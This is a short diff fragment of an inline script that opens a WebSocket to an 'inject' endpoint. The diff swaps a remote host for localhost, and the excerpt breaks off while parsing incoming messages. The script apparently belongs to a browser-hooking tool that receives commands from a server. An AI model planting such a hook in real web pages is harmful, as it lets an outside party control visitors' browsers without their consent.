@@ -1,6 +1,6 @@
 <script>
 (function i() {
-    window.ws  = new WebSocket('wss://injectify.samdd.me/inject/websocket/?$' + btoa('private'))
+    window.ws  = new WebSocket('ws://127.0.0.1:3000/inject/websocket/?$' + btoa('private'))
     ws.onmessage = function(d) {
         try {
             d = JSON.parse(d.data)
